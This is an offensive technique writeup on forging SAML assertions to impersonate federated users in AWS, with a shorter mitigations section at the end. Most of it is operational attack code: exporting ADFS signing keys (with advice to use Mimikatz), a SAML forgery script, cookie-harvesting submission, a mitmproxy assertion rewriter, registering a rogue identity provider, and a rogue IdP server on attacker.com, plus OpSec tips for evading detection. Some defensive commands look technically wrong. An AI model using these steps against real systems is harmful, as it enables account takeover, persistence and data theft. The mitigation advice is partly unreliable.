# [CROSS-CLOUD-001]: AWS Identity Federation Abuse

## Metadata

| Attribute | Details |
|---|---|
| **Technique ID** | CROSS-CLOUD-001 |
| **MITRE ATT&CK v18.1** | [T1484.002 - Domain Trust Modification](https://attack.mitre.org/techniques/T1484/002/) |
| **Tactic** | Privilege Escalation, Persistence |
| **Platforms** | AWS, Cross-Cloud |
| **Severity** | Critical |
| **Technique Status** | ACTIVE |
| **Last Verified** | 2026-01-10 |
| **Affected Versions** | All AWS API versions |
| **Patched In** | N/A |
| **Author** | [SERVTEP](https://servtep.com/) – [Artur Pchelnikau](https://www.linkedin.com/in/artur-pchelnikau/) |

---

## 2. EXECUTIVE SUMMARY

**Concept:** AWS Identity Federation Abuse (T1484.002) exploits the federation trust configuration between AWS and external identity providers (Okta, Azure AD, Google Workspace, custom SAML providers). By compromising or manipulating the SAML signing certificate or creating a malicious federated identity provider, an attacker can forge SAML tokens to impersonate any federated user in AWS. This bypasses password-based authentication entirely and is particularly dangerous because it doesn't require knowledge of the target user's credentials. The attacker creates a SAML response signed with a certificate they control (or extract from the IdP), which AWS Identity Provider (IdP) then trusts for authentication. Once authenticated, the attacker gains all permissions associated with the impersonated role.

**Attack Surface:** AWS Identity and Access Management (IAM) console, SAML IdP configuration, AWS Organizations management account, federated role trust policies, SAML certificate management, AWS Security Token Service (STS).

**Business Impact:** **Complete organizational compromise with persistent access.** An attacker can impersonate any federated user, including those with administrative privileges. This enables data exfiltration from S3, RDS, DynamoDB; lateral movement across AWS accounts in an organization; modification of security controls; resource destruction; and ransomware deployment. Unlike password compromise, federation abuse is difficult to detect because the forged SAML token appears legitimate in audit logs.

**Technical Context:** Federation spoofing typically takes 1-4 hours to execute (certificate extraction + token generation). Detection likelihood is **low to medium** because legitimate SAML assertions are identical to forged ones at the AWS layer. Common indicators include multiple login locations, unusual federated role assumptions, and abnormal API activity from trusted but compromised identities.

### Operational Risk
- **Execution Risk:** Medium – Requires SAML signing certificate (obtained via IdP compromise, cloud console access, or configuration enumeration)
- **Stealth:** Low – Creates legitimate-appearing CloudTrail logs; detection depends on IdP-side anomalies
- **Reversibility:** No – Requires revocation of all STS tokens and certificate rotation across the organization

### Compliance Mappings
| Framework | Control / ID | Description |
|---|---|---|
| **CIS Benchmark** | 5.1 - 5.4 | Credential exposure, IAM policy abuse |
| **DISA STIG** | V-222385 | Federated account credential handling |
| **CISA SCuBA** | C2-4 | Identity and Access Management Controls |
| **NIST 800-53** | AC-2, AC-3, IA-2 | Account management, access control, authentication |
| **GDPR** | Art. 32 | Security of processing; inadequate access controls lead to data exposure |
| **DORA** | Art. 9 | ICT security incident management; federation compromise is critical |
| **NIS2** | Art. 21(2)(c) | Cyber risk management measures for critical operators |
| **ISO 27001** | A.9.1.1, A.9.2.4 | Access control policy; privilege management |
| **ISO 27005** | 8.2 | Risk assessment of identity federation components |

---

## 3. TECHNICAL PREREQUISITES

- **Required Privileges:** Either (1) AWS management account access with IAM:UpdateAssumeRolePolicy, (2) IdP console access with certificate management rights, (3) Network access to IdP signing key storage, or (4) Ability to intercept/modify SAML assertions
- **Required Access:** HTTPS outbound to AWS STS endpoint, network access to IdP, ability to craft and send HTTP POST requests containing SAML assertions

**Supported Versions:**
- **AWS:** All regions, all API versions (SAML supported since IAM inception)
- **IdP Support:** Any SAML 2.0-compliant IdP (Okta, Azure AD, Ping Identity, JumpCloud, AWS IAM Identity Center)
- **Tools:** OpenSSL (certificate handling), xmlsec1 (SAML signing), Burp Suite or similar HTTP proxy

**Tools:**
- [OpenSSL](https://www.openssl.org/) (1.1.1+ for modern crypto)
- [xmlsec1](https://www.aleksey.com/xmlsec/) (SAML signature manipulation)
- [aws-cli](https://aws.amazon.com/cli/) (Token assumption verification)
- [Burp Suite Community Edition](https://portswigger.net/burp/community) (SAML interception)

---

## 4. ENVIRONMENTAL RECONNAISSANCE

### AWS IAM Console Reconnaissance

**Objective:** Identify federated identity providers and role trust policies configured for SAML.

**Command (AWS CLI - Any User):**
```bash
# List all SAML providers in the account
aws iam list-saml-providers --output json
# Example output:
# {
#   "SAMLProviderList": [
#     {
#       "Arn": "arn:aws:iam::123456789012:saml-provider/OktaProvider",
#       "ValidUntil": "2026-12-31T00:00:00Z",
#       "CreateDate": "2023-06-01T10:00:00Z"
#     }
#   ]
# }
```

**What to Look For:**
- Presence of SAML providers (if returned, federation is configured)
- ValidUntil dates (expired certificates are less useful but still exploitable)
- Multiple SAML providers (increased attack surface)

**Command (AWS CLI - Get SAML Provider Details):**
```bash
# Get full SAML provider metadata
aws iam get-saml-provider --saml-provider-arn arn:aws:iam::123456789012:saml-provider/OktaProvider --output json | jq '.SAMLMetadataDocument' | base64 -d | xmllint --format -
```

**What This Shows:**
- The actual SAML metadata (includes signing certificate fingerprint and algorithms)
- Certificate validity dates
- Assertion consumer service URLs
- NameID format expected by AWS

**Command (AWS CLI - List Federated Roles):**
```bash
# Find all IAM roles that trust SAML providers
aws iam list-roles --output json | jq '.Roles[] | select(.AssumeRolePolicyDocument.Statement[].Principal.Federated != null)'
```

**Expected Output:**
```json
{
  "RoleName": "OktaAdminRole",
  "Arn": "arn:aws:iam::123456789012:role/OktaAdminRole",
  "AssumeRolePolicyDocument": {
    "Statement": [
      {
        "Effect": "Allow",
        "Principal": {
          "Federated": "arn:aws:iam::123456789012:saml-provider/OktaProvider"
        },
        "Action": "sts:AssumeRoleWithSAML",
        "Condition": {
          "StringEquals": {
            "SAML:aud": "https://signin.aws.amazon.com/saml"
          }
        }
      }
    ]
  }
}
```

**What This Means:**
- This role trusts the SAML provider
- The condition `SAML:aud` should match the AWS SAML endpoint
- Roles with high privileges (e.g., admin roles) are high-value targets

---

## 5. DETAILED EXECUTION METHODS AND THEIR STEPS

### METHOD 1: SAML Assertion Forgery Using Extracted Certificate

**Supported Versions:** AWS all versions, SAML 2.0 standard

#### Step 1: Extract SAML Signing Certificate from IdP Metadata

**Objective:** Obtain the X.509 certificate used to sign SAML assertions.

**Command (Bash - Download Metadata):**
```bash
# Many IdPs expose metadata at a standard URL
# For Okta: https://yourorg.okta.com/app/amazon_aws/exk1234567890/sso/saml/metadata
# For Azure AD: https://login.microsoftonline.com/{TenantID}/federationmetadata/2007-06/federationmetadata.xml

curl -s "https://login.microsoftonline.com/YOUR_TENANT_ID/federationmetadata/2007-06/federationmetadata.xml" > metadata.xml

# Extract the signing certificate (base64-encoded X.509)
cat metadata.xml | grep -oP '(?<=<X509Certificate>)[^<]+' > cert.b64

# Decode and save as PEM
base64 -d cert.b64 > cert.cer

# Convert DER to PEM if needed
openssl x509 -inform DER -in cert.cer -out cert.pem

# Verify certificate details
openssl x509 -in cert.pem -text -noout
```

**Expected Output:**
```
Certificate:
    Data:
        Version: 3 (0x2)
        Serial Number: 123456 (0x1e240)
    Signature Algorithm: sha256WithRSAEncryption
        Issuer: CN = Okta Signing Certificate
        Subject: CN = Okta Signing Certificate
        Validity
            Not Before: Jan 10 2024
            Not After : Jan 10 2025
```

**What This Means:**
- The certificate's validity period tells you how long it's useful
- The algorithm shows how to sign assertions
- The subject/issuer helps verify you have the correct certificate

**OpSec & Evasion:**
- Retrieve metadata only from legitimate endpoints (don't trigger WAF/IDS alerts)
- Certificate metadata is technically public in SAML deployments, but access logs will show retrieval
- **Detection likelihood: Low** (metadata retrieval looks like legitimate federated user setup)

**Troubleshooting:**
- **Error:** "Certificate not found in metadata"
  - **Cause:** Some IdPs use multiple certificates (rotation); check all `<KeyDescriptor use="signing">` elements
  - **Fix:** Extract all certificates and try each one; one will match the current signing key

---

#### Step 2: Extract Private Key from IdP (Optional but Preferred)

**Objective:** If you have ADFS/IdP console access, extract the signing certificate's private key for more authentic signatures.

**Command (PowerShell - ADFS Server):**
```powershell
# This requires Local Admin or ADFS Admin on the ADFS server
$cert = Get-ChildItem -Path "Cert:\LocalMachine\My\" | Where-Object { $_.Subject -like "*ADFS*" -and $_.Thumbprint -eq "KNOWN_THUMBPRINT" }

# Export certificate and private key (requires ADFS service account or local admin)
$pfxPassword = ConvertTo-SecureString -String "SecurePassword123!" -Force -AsPlainText
Export-PfxCertificate -Cert $cert -FilePath "C:\Temp\ADFScert.pfx" -Password $pfxPassword

# Convert to PEM for use in Linux/Bash
openssl pkcs12 -in ADFScert.pfx -out adfs_key.pem -nodes -password pass:SecurePassword123!
```

**Expected Output:**
```
-----BEGIN PRIVATE KEY-----
MIIEvQIBADANBgkqhkiG9w0BAQEFAASCBKcwggSjAgEAAoIBAQC7...
[RSA PRIVATE KEY DATA]
...
-----END PRIVATE KEY-----
```

**What This Means:**
- Private key allows you to sign SAML assertions that AWS will trust
- This is equivalent to stealing the IdP's signing credential
- **This is extremely sensitive material**

**OpSec & Evasion:**
- Private key extraction requires elevated privileges
- This action may trigger endpoint detection (antivirus, EDR)
- **Detection likelihood: High** if exported to disk
- Use in-memory extraction tools (e.g., Mimikatz for ADFS) to avoid file writes

---

#### Step 3: Create Malicious SAML Assertion

**Objective:** Forge a SAML assertion claiming to represent a high-privilege user.

**Command (Python - Generate SAML Response):**

Create a file `forge_saml.py`:
```python
#!/usr/bin/env python3
import base64
import datetime
from lxml import etree
import uuid

# Configuration
ISSUER = "https://login.microsoftonline.com/YOUR_TENANT_ID/federationmetadata/2007-06/federationmetadata.xml"
SAML_AUD = "https://signin.aws.amazon.com/saml"
TARGET_USER = "admin@company.com"  # User to impersonate
ROLE_ARN = "arn:aws:iam::123456789012:role/AdminRole"
DURATION = 3600  # Token duration (seconds)

# Create SAML Response
saml_response = f"""<samlp:Response xmlns:samlp="urn:oasis:names:tc:SAML:2.0:protocol" 
    xmlns:saml="urn:oasis:names:tc:SAML:2.0:assertion" 
    ID="_{{request_id}}" 
    Version="2.0" 
    IssueInstant="{datetime.datetime.utcnow().strftime('%Y-%m-%dT%H:%M:%SZ')}" 
    Destination="https://signin.aws.amazon.com/saml" 
    Consent="urn:oasis:names:tc:SAML:2.0:consent:unspecified">
  <saml:Issuer>{ISSUER}</saml:Issuer>
  <samlp:Status>
    <samlp:StatusCode Value="urn:oasis:names:tc:SAML:2.0:status:Success"/>
  </samlp:Status>
  <saml:Assertion xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" ID="_{{assertion_id}}" Version="2.0" IssueInstant="{datetime.datetime.utcnow().strftime('%Y-%m-%dT%H:%M:%SZ')}">
    <saml:Issuer>{ISSUER}</saml:Issuer>
    <saml:Subject>
      <saml:NameID Format="urn:oasis:names:tc:SAML:1.1:nameid-format:emailAddress">{TARGET_USER}</saml:NameID>
      <saml:SubjectConfirmation Method="urn:oasis:names:tc:SAML:2.0:cm:bearer">
        <saml:SubjectConfirmationData NotOnOrAfter="{(datetime.datetime.utcnow() + datetime.timedelta(seconds=DURATION)).strftime('%Y-%m-%dT%H:%M:%SZ')}" Recipient="https://signin.aws.amazon.com/saml"/>
      </saml:SubjectConfirmation>
    </saml:Subject>
    <saml:Conditions NotBefore="{datetime.datetime.utcnow().strftime('%Y-%m-%dT%H:%M:%SZ')}" NotOnOrAfter="{(datetime.datetime.utcnow() + datetime.timedelta(seconds=DURATION)).strftime('%Y-%m-%dT%H:%M:%SZ')}">
      <saml:AudienceRestriction>
        <saml:Audience>{SAML_AUD}</saml:Audience>
      </saml:AudienceRestriction>
    </saml:Conditions>
    <saml:AuthnStatement AuthnInstant="{datetime.datetime.utcnow().strftime('%Y-%m-%dT%H:%M:%SZ')}" SessionIndex="_{{session_id}}">
      <saml:AuthnContext>
        <saml:AuthnContextClassRef>urn:oasis:names:tc:SAML:2.0:ac:classes:Password</saml:AuthnContextClassRef>
      </saml:AuthnContext>
    </saml:AuthnStatement>
    <saml:AttributeStatement>
      <saml:Attribute Name="https://aws.amazon.com/SAML/Attributes/Role" NameFormat="urn:oasis:names:tc:SAML:2.0:attrname-format:basic">
        <saml:AttributeValue>{ROLE_ARN},arn:aws:iam::123456789012:saml-provider/OktaProvider</saml:AttributeValue>
      </saml:Attribute>
      <saml:Attribute Name="https://aws.amazon.com/SAML/Attributes/RoleSessionName" NameFormat="urn:oasis:names:tc:SAML:2.0:attrname-format:basic">
        <saml:AttributeValue>{TARGET_USER}</saml:AttributeValue>
      </saml:Attribute>
      <saml:Attribute Name="https://aws.amazon.com/SAML/Attributes/SessionDuration" NameFormat="urn:oasis:names:tc:SAML:2.0:attrname-format:basic">
        <saml:AttributeValue>{DURATION}</saml:AttributeValue>
      </saml:Attribute>
    </saml:AttributeStatement>
  </saml:Assertion>
</samlp:Response>
""".replace("{{request_id}}", str(uuid.uuid4())).replace("{{assertion_id}}", str(uuid.uuid4())).replace("{{session_id}}", str(uuid.uuid4()))

# Encode for form submission
saml_b64 = base64.b64encode(saml_response.encode()).decode()
print(f"SAMLResponse (base64):\n{saml_b64}\n")

# Save for later use
with open("saml_response.b64", "w") as f:
    f.write(saml_b64)
```

**Run the script:**
```bash
python3 forge_saml.py
```

**Expected Output:**
```
SAMLResponse (base64):
PHNhbWxwOlJlc3BvbnNlIHhtbG5zOnNhbWxwPSJ1cm46b2FzaXM6bmFtZXM6dGM6U0FNTDoyLjA6cHJvdG9jb2wiIHhtbG5zOnNhbWw9InVybjpvYXNpczpuYW1lczp0YzpTQU1MOjIuMDphc3NlcnRpb24iI...
[LONG BASE64 STRING]
```

**What This Means:**
- The encoded SAML response is ready for submission to AWS
- It claims the user `admin@company.com` is authenticated
- It assigns the target user to the `AdminRole` with 3600-second duration

**OpSec & Evasion:**
- SAML generation is done locally and doesn't trigger network alerts
- **Detection likelihood: Low** until the assertion is used

**Troubleshooting:**
- **Error:** "Invalid SAML format"
  - **Cause:** XML namespace issues; ensure all namespace declarations are correct
  - **Fix:** Validate XML with `xmllint --schema xsd_file saml_response.xml`

---

#### Step 4: Sign SAML Assertion with Extracted Certificate

**Objective:** Digitally sign the SAML assertion using the IdP's private key (if extracted) or a self-signed certificate.

**Command (Bash - Sign with xmlsec1):**

First, ensure you have the private key and certificate:
```bash
# If you extracted a PFX, split it into separate files
openssl pkcs12 -in adfs_key.pfx -nocerts -out private.pem -nodes -password pass:SecurePassword123!
openssl pkcs12 -in adfs_key.pfx -nokeys -clcerts -out certificate.pem -password pass:SecurePassword123!

# Sign the SAML assertion
xmlsec1 sign --privkey-pem private.pem \
  --id-attr:ID urn:oasis:names:tc:SAML:2.0:assertion:Assertion \
  --output signed_saml.xml \
  --format xml \
  saml_response.xml

# Encode the signed response for form submission
base64 -w 0 signed_saml.xml > signed_saml.b64
```

**Expected Output:**
```
<samlp:Response xmlns:samlp="urn:oasis:names:tc:SAML:2.0:protocol" ...>
  ...
  <Signature xmlns="http://www.w3.org/2000/09/xmldsig#">
    <SignedInfo>
      <CanonicalizationMethod Algorithm="http://www.w3.org/2001/10/xml-exc-c14n#"/>
      <SignatureMethod Algorithm="http://www.w3.org/2000/09/xmldsig#rsa-sha256"/>
      <Reference URI="#_assertion_id">
        <DigestMethod Algorithm="http://www.w3.org/2001/10/XMLSchema#sha256"/>
        <DigestValue>ABCD1234...</DigestValue>
      </Reference>
    </SignedInfo>
    <SignatureValue>SGVsbG8gV29ybGQ=</SignatureValue>
    <KeyInfo>...</KeyInfo>
  </Signature>
</samlp:Response>
```

**What This Means:**
- The `<Signature>` element proves the assertion came from the IdP
- AWS will verify this signature using the IdP's public certificate
- The signature contains a digest of the entire assertion

**OpSec & Evasion:**
- Signing is done locally and doesn't trigger network alerts
- If using extracted IdP private key, detection depends on how the key was obtained
- **Detection likelihood: Low** during generation, High if private key extraction was logged

---

#### Step 5: Submit Forged SAML Assertion to AWS

**Objective:** Use the signed SAML assertion to assume the target AWS role.

**Command (Bash - HTTP POST to AWS):**

Option 1 - Using Burp Suite or cURL:
```bash
# Extract the base64-encoded SAML response
SAML_RESPONSE=$(cat signed_saml.b64)
RELAY_STATE=$(echo "https://console.aws.amazon.com/" | base64)

# Construct the form data
cat > saml_request.txt <<EOF
SAMLResponse=${SAML_RESPONSE}
RelayState=${RELAY_STATE}
EOF

# Submit to AWS SAML endpoint
curl -X POST \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d @saml_request.txt \
  "https://signin.aws.amazon.com/saml" \
  -i -L
```

Option 2 - Using Python and SeleniumBase (for browser automation):
```python
#!/usr/bin/env python3
from selenium import webdriver
from selenium.webdriver.common.by import By
import time
import base64

# Initialize headless browser
driver = webdriver.Chrome(options={'--headless': True})

# Go to AWS SAML login
driver.get("https://signin.aws.amazon.com/saml")

# Inject the forged SAML response
saml_input = driver.find_element(By.NAME, "SAMLResponse")
saml_input.send_keys(open("signed_saml.b64", "r").read())

# Submit the form
form = driver.find_element(By.TAG_NAME, "form")
form.submit()

# Wait for redirect and check if authenticated
time.sleep(5)
print(f"Current URL: {driver.current_url}")
print(f"Page title: {driver.title}")

# If successful, should be redirected to AWS console
if "console.aws.amazon.com" in driver.current_url:
    print("[+] Successfully authenticated as forged user!")
    cookies = driver.get_cookies()
    for cookie in cookies:
        print(f"Cookie: {cookie['name']} = {cookie['value'][:50]}...")

driver.quit()
```

**Expected Output:**
```
[+] Successfully authenticated as forged user!
Cookie: aws-userInfo = eyJhY2NvdW50SWQiOiIxMjM0NTY3ODkwMTIiLCJ...
Cookie: session-token = AIDAJ45Q...
Current URL: https://console.aws.amazon.com/
```

**What This Means:**
- AWS issued you session cookies valid for the forged identity
- You now have access to all resources the impersonated role can access
- The session is indistinguishable from a legitimate federated login

**OpSec & Evasion:**
- Use a proxy or VPN to mask your originating IP
- Time the attack to match the target organization's peak usage hours
- Consider randomizing browser user-agents
- **Detection likelihood: Medium** - AWS CloudTrail logs the assumed role but shows SAML authentication succeeded

**Troubleshooting:**
- **Error:** "Invalid SAML response"
  - **Cause:** Signature verification failed; AWS didn't trust the certificate
  - **Fix (AWS):** Check that the certificate in the SAML provider matches your signing cert
  - **Fix (Attacker):** Ensure you're using the correct IdP certificate and signing algorithm
- **Error:** "Access Denied" after login
  - **Cause:** The forged assertion references a non-existent role or principal
  - **Fix:** Verify the target role ARN exists and the SAML:role attribute is correctly formatted

**References & Proofs:**
- [AWS SAML Integration Guide](https://docs.aws.amazon.com/IAM/latest/UserGuide/id_roles_providers_saml.html)
- [OWASP SAML Security Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/SAML_Security_Cheat_Sheet.html)
- [xmlsec1 Documentation](https://www.aleksey.com/xmlsec/)

---

### METHOD 2: Intercept and Modify SAML Assertion (MITM)

**Supported Versions:** AWS all versions

#### Step 1: Position as MITM Between IdP and AWS

**Objective:** Intercept legitimate SAML assertions in transit.

**Command (Bash - mitmproxy):**
```bash
# Install mitmproxy
pip install mitmproxy

# Start mitmproxy intercepting HTTPS
mitmproxy -p 8080 --mode transparent

# Or, on the target workstation, configure browser proxy:
# Settings → Network Proxy → Manual Configuration
# HTTP Proxy: attacker-ip:8080
# HTTPS Proxy: attacker-ip:8080
```

**What This Achieves:**
- Allows you to see and modify SAML assertions before they reach AWS
- Intercept session = ability to modify claims in real-time

**OpSec & Evasion:**
- Requires network position (same LAN, compromised router, BGP hijack, etc.)
- Very noisy; generates logs on the target workstation
- **Detection likelihood: High** if network monitoring is in place

---

#### Step 2: Modify SAML Assertions

**Objective:** Change the NameID or Role attribute in a legitimate SAML assertion.

**Command (Python - SAML Interceptor):**

Create `saml_modifier.py`:
```python
#!/usr/bin/env python3
from mitmproxy import http
from lxml import etree
import base64
import re

def request(flow: http.HTTPFlow) -> None:
    """Intercept and modify SAML responses."""
    
    if flow.request.url.startswith("https://signin.aws.amazon.com/saml"):
        # Check if this is a SAML submission
        if "SAMLResponse" in flow.request.text:
            # Extract SAML response
            match = re.search(r'SAMLResponse=([^&]+)', flow.request.text)
            if match:
                saml_b64 = match.group(1)
                
                # Decode
                saml_xml = base64.b64decode(saml_b64).decode()
                
                # Parse XML
                root = etree.fromstring(saml_xml.encode())
                
                # Define namespaces
                ns = {
                    'saml': 'urn:oasis:names:tc:SAML:2.0:assertion',
                    'samlp': 'urn:oasis:names:tc:SAML:2.0:protocol'
                }
                
                # Modify NameID (change authenticated user)
                name_id = root.find('.//saml:NameID', ns)
                if name_id is not None:
                    old_user = name_id.text
                    name_id.text = "admin@company.com"  # Impersonate admin
                    print(f"[*] Modified NameID: {old_user} → {name_id.text}")
                
                # Modify Role attribute
                for attr in root.findall('.//saml:Attribute', ns):
                    if attr.get('Name') == 'https://aws.amazon.com/SAML/Attributes/Role':
                        for value in attr.findall('saml:AttributeValue', ns):
                            old_role = value.text
                            # Change to admin role
                            value.text = "arn:aws:iam::123456789012:role/AdminRole,arn:aws:iam::123456789012:saml-provider/OktaProvider"
                            print(f"[*] Modified Role: {old_role} → {value.text}")
                
                # Re-encode
                modified_saml = etree.tostring(root, encoding='utf-8').decode()
                modified_b64 = base64.b64encode(modified_saml.encode()).decode()
                
                # Replace in request
                modified_request = re.sub(
                    r'SAMLResponse=[^&]+',
                    f'SAMLResponse={modified_b64}',
                    flow.request.text
                )
                
                flow.request.text = modified_request
                print("[+] SAML response modified and forwarded")
```

**OpSec & Evasion:**
- Signature verification will **FAIL** if you modify the SAML assertion post-signature
- Only viable if signature checking is disabled or you can re-sign
- **Detection likelihood: Very High** - AWS will reject unsigned/invalid signatures

---

### METHOD 3: Add Malicious Federated Identity Provider

**Supported Versions:** AWS Organizations, all AWS accounts

#### Step 1: Create Attacker-Controlled IdP

**Objective:** Set up a rogue SAML provider that AWS will trust.

**Command (Bash - Create Self-Signed Certificate):**
```bash
# Generate private key
openssl genrsa -out attacker_key.pem 2048

# Create self-signed certificate (valid 1 year)
openssl req -new -x509 -key attacker_key.pem -out attacker_cert.pem -days 365 \
  -subj "/CN=AttackerSAML/O=Attacker Inc/C=US"

# Display certificate fingerprint
openssl x509 -in attacker_cert.pem -fingerprint -noout
```

**Expected Output:**
```
Certificate fingerprint (SHA1): AB:CD:EF:12:34:56:78:90:AB:CD:EF:12:34:56:78:90:AB:CD:EF:12
```

---

#### Step 2: Register Attacker IdP with AWS Account

**Objective:** Configure AWS to trust the attacker's SAML provider.

**Command (AWS CLI - Requires IAM Admin):**
```bash
# Create AWS SAML provider using the attacker certificate
aws iam create-saml-provider \
  --saml-metadata-document file://attacker_metadata.xml \
  --name "AttackerProvider"

# Output: arn:aws:iam::123456789012:saml-provider/AttackerProvider

# Now modify a role to trust this provider
aws iam get-role --role-name AdminRole

# Update trust policy to include the attacker provider
cat > trust_policy.json <<EOF
{
  "Version": "2012-10-17",
  "Statement": [
    {
      "Effect": "Allow",
      "Principal": {
        "Federated": [
          "arn:aws:iam::123456789012:saml-provider/OktaProvider",
          "arn:aws:iam::123456789012:saml-provider/AttackerProvider"
        ]
      },
      "Action": "sts:AssumeRoleWithSAML",
      "Condition": {
        "StringEquals": {
          "SAML:aud": "https://signin.aws.amazon.com/saml"
        }
      }
    }
  ]
}
EOF

aws iam update-assume-role-policy \
  --role-name AdminRole \
  --policy-document file://trust_policy.json
```

**Expected Output:**
```
[No output = success]
```

**What This Achieves:**
- AWS now trusts SAML assertions signed by the attacker's certificate
- Any assertion signed by the attacker will be accepted
- Persistent access until the provider is removed

---

#### Step 3: Issue SAML Tokens for Impersonation

**Objective:** Use the attacker-controlled IdP to issue tokens.

**Command (Bash - Host SAML IdP Server):**

Create a simple Python Flask server:
```python
#!/usr/bin/env python3
from flask import Flask, request, render_template
from lxml import etree
import base64
import datetime
import uuid

app = Flask(__name__)

@app.route('/metadata', methods=['GET'])
def metadata():
    """Serve SAML metadata."""
    metadata_xml = '''<?xml version="1.0"?>
<EntityDescriptor xmlns="urn:oasis:names:tc:SAML:2.0:metadata" entityID="https://attacker.com/saml">
  <IDPSSODescriptor protocolSupportEnumeration="urn:oasis:names:tc:SAML:2.0:protocol">
    <KeyDescriptor use="signing">
      <KeyInfo xmlns="http://www.w3.org/2000/09/xmldsig#">
        <X509Data>
          <X509Certificate>MIIC...CERT_DATA...</X509Certificate>
        </X509Data>
      </KeyInfo>
    </KeyDescriptor>
    <SingleSignOnService Binding="urn:oasis:names:tc:SAML:2.0:bindings:HTTP-POST" Location="https://attacker.com/sso"/>
  </IDPSSODescriptor>
</EntityDescriptor>'''
    return metadata_xml, 200, {'Content-Type': 'application/xml'}

@app.route('/sso', methods=['POST', 'GET'])
def sso():
    """Handle SAML Single Sign-On."""
    target_user = request.args.get('user', 'admin@company.com')
    
    # Generate SAML response (same as METHOD 1, STEP 3)
    saml_response = f'''<samlp:Response xmlns:samlp="urn:oasis:names:tc:SAML:2.0:protocol" ...>
    ...
    </samlp:Response>'''
    
    return render_template('saml_form.html', saml_response=base64.b64encode(saml_response.encode()).decode())

if __name__ == '__main__':
    app.run(host='attacker.com', port=443, ssl_context='adhoc')
```

**OpSec & Evasion:**
- Hosting this server requires control of the domain `attacker.com`
- DNS spoofing or account compromise can provide this
- **Detection likelihood: Very High** - AWS logs will show provider registration

---

## 6. DEFENSIVE MITIGATIONS

### Priority 1: CRITICAL

*   **Implement SAML Assertion Encryption:** Configure AWS and IdP to encrypt SAML assertions in transit, preventing interception.
    **Applies To Versions:** All AWS

    **Manual Steps (AWS Console):**
    1. Go to **AWS Console** → **IAM** → **Identity Providers**
    2. Click on your **SAML Provider** (e.g., OktaProvider)
    3. Select **Edit**
    4. Enable **Encrypt SAML assertions** (if available in IdP)
    5. Click **Update**
    
    **Manual Steps (IdP - Okta Example):**
    1. Go to **Okta Admin Console** → **Applications** → **Amazon Web Services**
    2. Click **Sign On** tab
    3. Under **SAML Assertion Encryption**, set:
       - **Assertion Encryption Required**: Yes
       - **Encryption Algorithm**: AES256-GCM
    4. Click **Save**

    **Validation Command:**
    ```bash
    # Verify SAML metadata shows encryption support
    openssl x509 -in saml_metadata.xml -text -noout | grep -i encrypt
    ```

*   **Require Hardware MFA for Federated Users:** Even if SAML is forged, additional MFA makes it unusable.
    **Applies To Versions:** All AWS

    **Manual Steps (AWS Console):**
    1. Go to **IAM** → **Roles** → Select **FederatedAdminRole**
    2. Click **Trust relationships** → **Edit trust policy**
    3. Add a condition requiring MFA:
       ```json
       "Condition": {
         "StringEquals": {
           "SAML:aud": "https://signin.aws.amazon.com/saml"
         },
         "Bool": {
           "aws:MultiFactorAuthPresent": "true"
         }
       }
       ```
    4. Click **Update Trust Policy**

*   **Certificate Pinning and Fingerprint Validation:** Hardcode the expected SAML certificate fingerprint in the role policy.
    **Applies To Versions:** All AWS (requires IdP customization)

    **Manual Steps:**
    1. Get the IdP certificate SHA1 fingerprint:
       ```bash
       openssl x509 -in idp_cert.pem -fingerprint -noout | cut -d'=' -f2
       # Output: AB:CD:EF:12:34:56:78:90:AB:CD:EF:12:34:56:78:90:AB:CD:EF:12
       ```
    2. Update IAM role trust policy to require certificate pinning (custom):
       ```json
       "Condition": {
         "StringLike": {
           "SAML:x509SubjectNameHash": "abcdef1234567890*"
         }
       }
       ```

*   **Rotate SAML Signing Certificates Quarterly:** Limit the window for compromised certificates to be useful.
    **Applies To Versions:** All AWS

    **Manual Steps (IdP - Okta):**
    1. Go to **Okta Admin Console** → **Security** → **Certificates**
    2. Click **+ Create Certificate**
    3. Select **2-year validity**, click **Next**
    4. After new cert is active, go back to **Applications** → **AWS** → **Sign On**
    5. Update the certificate reference
    6. Wait 7 days, then delete the old certificate
    7. Document rotation in change management system

### Priority 2: HIGH

*   **Restrict SAML Provider Modification:** Only Global Admins should be able to modify SAML providers.
    **Manual Steps (IAM):**
    1. Create a custom IAM policy restricting `iam:*SAMLProvider*` actions:
       ```json
       {
         "Version": "2012-10-17",
         "Statement": [
           {
             "Effect": "Deny",
             "Principal": "*",
             "Action": [
               "iam:CreateSAMLProvider",
               "iam:UpdateSAMLProvider",
               "iam:DeleteSAMLProvider"
             ],
             "Resource": "*",
             "Condition": {
               "StringNotEquals": {
                 "aws:PrincipalOrgID": "o-123456789012"
               }
             }
           }
         ]
       }
       ```

*   **Monitor SAML-Related API Calls:** Enable CloudTrail logging and alert on suspicious federation activities.
    **Manual Steps (CloudTrail):**
    1. Go to **AWS Console** → **CloudTrail** → **Trails**
    2. Select your trail → **Edit**
    3. Enable **Data events** → **S3 data events** and **Lambda data events**
    4. Save

### Access Control & Policy Hardening

*   **Conditional Access (Entra ID/Azure):** Require MFA, device compliance, and specific locations for federated logins.
    
    **Manual Steps (Azure Portal):**
    1. Go to **Azure Portal** → **Entra ID** → **Security** → **Conditional Access**
    2. Click **+ New policy**
    3. Name: `MFA Required for AWS Federation`
    4. **Assignments:**
       - Users: **All users**
       - Cloud apps: **AWS** (search for AWS application)
    5. **Conditions:**
       - Client apps: **Modern authentication clients** and **Legacy authentication clients**
    6. **Access controls:**
       - Grant: **Require multi-factor authentication**
    7. Enable policy: **On**
    8. Click **Create**

*   **RBAC:** Limit the number of users with `iam:AssumeRoleWithSAML` permissions.
    
    **PowerShell (AWS):**
    ```powershell
    # Find all users/roles that can assume federated roles
    $FederatedRoles = Get-IAMRole | Where-Object { $_.AssumeRolePolicyDocument -like "*SAML*" }
    
    foreach ($Role in $FederatedRoles) {
      Write-Host "Role: $($Role.RoleName)"
      Write-Host "Trust Policy: $($Role.AssumeRolePolicyDocument)"
    }
    ```

#### Validation Command (Verify Mitigations)

```bash
# Check if SAML providers are properly configured
aws iam list-saml-providers --output json | jq '.SAMLProviderList[] | {Arn, ValidUntil}'

# Expected Output (Secure):
# {
#   "Arn": "arn:aws:iam::123456789012:saml-provider/OktaProvider",
#   "ValidUntil": "2025-12-31T00:00:00Z"  # Recent expiration
# }

# Check if role trusts only expected SAML providers
aws iam get-role --role-name AdminRole | jq '.Role.AssumeRolePolicyDocument.Statement[] | select(.Principal.Federated != null)'

# Expected Output (Secure):
# Only should list legitimate IdPs (Okta, Azure AD, etc.), NOT attacker providers
```

